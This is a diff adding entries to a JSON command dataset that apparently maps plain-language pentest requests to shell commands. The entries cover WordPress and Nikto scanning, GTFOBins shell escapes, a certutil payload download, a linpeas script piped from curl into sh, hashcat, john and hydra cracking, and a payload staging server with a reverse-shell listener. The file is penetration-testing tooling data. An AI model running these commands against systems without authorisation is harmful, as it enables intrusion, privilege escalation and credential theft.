+    "master_category": "WEB_SECURITY",
+    "canonical_nl": "enumerate wordpress vulnerable plugins and users with wpscan",
+    "default_cmd": "wpscan --url http://{target} --enumerate vp,vt,u",
+    "powershell_cmd": "wpscan --url http://{target} --enumerate vp,vt,u",
+    "cmd_exe": "wpscan --url http://{target} --enumerate vp,vt,u",
+    "is_destructive": false,
+    "explanation": "Enumerates vulnerable plugins, themes, and usernames on WordPress sites."
+  },
+  {
+    "action_id": "web_nikto_tuning_scan",
+    "category": "WEB_SECURITY",
+    "master_category": "WEB_SECURITY",
+    "canonical_nl": "run comprehensive nikto web server vulnerability scan",
+    "default_cmd": "nikto -h http://{target} -Tuning 123b",
+    "powershell_cmd": "nikto -h http://{target} -Tuning 123b",
+    "cmd_exe": "nikto -h http://{target} -Tuning 123b",
+    "is_destructive": false,
+    "explanation": "Scans web servers for dangerous files, outdated server software, and configuration weaknesses."
+  },
+  {
     "action_id": "privesc_gtfobins_find_exec",
     "category": "PRIVESC",
+    "master_category": "PRIVESC",
     "canonical_nl": "spawn privileged shell via find binary -exec flag",
     "default_cmd": "find . -exec /bin/sh \\; -quit",
     "powershell_cmd": "find . -exec /bin/sh \\; -quit",
@@ -542,6 +662,7 @@
   {
     "action_id": "privesc_gtfobins_vim_escape",
     "category": "PRIVESC",
+    "master_category": "PRIVESC",
     "canonical_nl": "break out of sudo or restricted shell using vim command execution",
     "default_cmd": "sudo vim -c ':!/bin/sh'",
     "powershell_cmd": "sudo vim -c ':!/bin/sh'",
@@ -552,6 +673,7 @@
   {
     "action_id": "privesc_lolbas_certutil_download",
     "category": "PRIVESC",
+    "master_category": "PRIVESC",
     "canonical_nl": "download remote binary payload onto windows target using certutil",
     "default_cmd": "certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
     "powershell_cmd": "certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
@@ -560,8 +682,42 @@
     "explanation": "Leverages native Windows Certificate utility to fetch arbitrary payloads over HTTP."
   },
   {
+    "action_id": "privesc_capabilities_audit",
+    "category": "PRIVESC",
+    "master_category": "PRIVESC",
+    "canonical_nl": "audit binary capabilities on linux system for privilege escalation",
+    "default_cmd": "getcap -r / 2>/dev/null",
+    "powershell_cmd": "wsl getcap -r / 2>/dev/null",
+    "cmd_exe": "wsl getcap -r / 2>/dev/null",
+    "is_destructive": false,
+    "explanation": "Finds binaries granted elevated Linux POSIX capabilities such as cap_setuid."
+  },
+  {
+    "action_id": "privesc_find_suid_bins",
+    "category": "PRIVESC",
+    "master_category": "PRIVESC",
+    "canonical_nl": "find all suid binaries on linux filesystem",
+    "default_cmd": "find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null",
+    "powershell_cmd": "wsl find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null",
+    "cmd_exe": "wsl find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null",
+    "is_destructive": false,
+    "explanation": "Searches the filesystem for binaries running with root owner SUID permissions."
+  },
+  {
+    "action_id": "privesc_linpeas_run",
+    "category": "PRIVESC",
+    "master_category": "PRIVESC",
+    "canonical_nl": "run linpeas privilege escalation auditor directly in memory",
+    "default_cmd": "curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "powershell_cmd": "wsl curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "cmd_exe": "wsl curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "is_destructive": false,
+    "explanation": "Runs LinPEAS directly from memory to enumerate local privilege escalation vectors."
+  },
+  {
     "action_id": "cracking_hashcat_ntlm_rockyou",
     "category": "CRACKING",
+    "master_category": "CRACKING",
     "canonical_nl": "crack NTLM password hashes using hashcat with rockyou wordlist on GPU",
     "default_cmd": "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O",
     "powershell_cmd": "hashcat.exe -m 1000 -a 0 hashes.txt rockyou.txt -O",
@@ -572,6 +728,7 @@
   {
     "action_id": "cracking_hydra_ssh_bruteforce",
     "category": "CRACKING",
+    "master_category": "CRACKING",
     "canonical_nl": "brute-force SSH credentials using hydra and rockyou wordlist",
     "default_cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
     "powershell_cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
@@ -580,8 +737,42 @@
     "explanation": "Conducts parallelized network authentication brute-force against SSH daemon."
   },
   {
+    "action_id": "cracking_hashcat_md5",
+    "category": "CRACKING",
+    "master_category": "CRACKING",
+    "canonical_nl": "crack md5 hashes using hashcat with rockyou dictionary",
+    "default_cmd": "hashcat -m 0 -a 0 {hashfile} /usr/share/wordlists/rockyou.txt",
+    "powershell_cmd": "hashcat.exe -m 0 -a 0 {hashfile} C:\\tools\\rockyou.txt",
+    "cmd_exe": "hashcat.exe -m 0 -a 0 {hashfile} C:\\tools\\rockyou.txt",
+    "is_destructive": false,
+    "explanation": "GPU-accelerated straight dictionary cracking of raw MD5 hashes."
+  },
+  {
+    "action_id": "cracking_john_shadow",
+    "category": "CRACKING",
+    "master_category": "CRACKING",
+    "canonical_nl": "crack linux shadow password hashes using john the ripper",
+    "default_cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}",
+    "powershell_cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}",
+    "cmd_exe": "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}",
+    "is_destructive": false,
+    "explanation": "Identifies hash types and executes CPU/GPU dictionary cracking via John the Ripper."
+  },
+  {
+    "action_id": "cracking_hydra_http_post",
+    "category": "CRACKING",
+    "master_category": "CRACKING",
+    "canonical_nl": "brute-force web login form using hydra http-post-form",
+    "default_cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\"",
+    "powershell_cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\"",
+    "cmd_exe": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\"",
+    "is_destructive": false,
+    "explanation": "Performs multi-threaded online dictionary attack against HTTP POST web authentication forms."
+  },
+  {
     "action_id": "orchestration_scan_then_fuzz",
     "category": "ORCHESTRATION",
+    "master_category": "ORCHESTRATION",
     "canonical_nl": "chain port scan and automated web directory fuzzing on discovered http ports",
     "default_cmd": "nmap -p 80,443 -sV {target} && gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
     "powershell_cmd": "nmap -p 80,443 -sV {target}; gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
@@ -592,11 +783,34 @@
   {
     "action_id": "orchestration_stage_and_listen",
     "category": "ORCHESTRATION",
+    "master_category": "ORCHESTRATION",
     "canonical_nl": "start background payload staging server and open reverse shell listener",
     "default_cmd": "python3 -m http.server {sport} & ncat -lvnp {lport}",
     "powershell_cmd": "Start-Process python -ArgumentList '-m http.server {sport}'; ncat -lvnp {lport}",
     "cmd_exe": "start python -m http.server {sport} && ncat -lvnp {lport}",
     "is_destructive": false,
     "explanation": "Spawns an HTTP staging delivery service in background while keeping foreground listener active."
+  },
+  {
+    "action_id": "orchestration_nmap_to_nuclei",
+    "category": "ORCHESTRATION",
+    "master_category": "ORCHESTRATION",
+    "canonical_nl": "scan web ports with nmap and pipe directly into nuclei vulnerability scanner",
+    "default_cmd": "nmap -sS -p80,443,8080 -T4 {target} -oG - | nuclei -severity high,critical",
+    "powershell_cmd": "wsl nmap -sS -p80,443,8080 -T4 {target} -oG - | nuclei -severity high,critical",
+    "cmd_exe": "wsl nmap -sS -p80,443,8080 -T4 {target} -oG - | nuclei -severity high,critical",
+    "is_destructive": false,
+    "explanation": "Chains initial port availability checking directly into CVE template execution."
+  },
+  {
+    "action_id": "orchestration_triage_playbook",
+    "category": "ORCHESTRATION",
+    "master_category": "ORCHESTRATION",
+    "canonical_nl": "run nmap service scan and correlate with exploit-db searchsploit",
+    "default_cmd": "nmap -sV -sC -oN scan.txt {target} && searchsploit --nmap scan.txt",
+    "powershell_cmd": "wsl nmap -sV -sC -oN scan.txt {target} && wsl searchsploit --nmap scan.txt",
+    "cmd_exe": "wsl nmap -sV -sC -oN scan.txt {target} && wsl searchsploit --nmap scan.txt",
+    "is_destructive": false,
+    "explanation": "Performs automated service enumeration and immediately queries Exploit-DB for public exploits."
   }
 ]
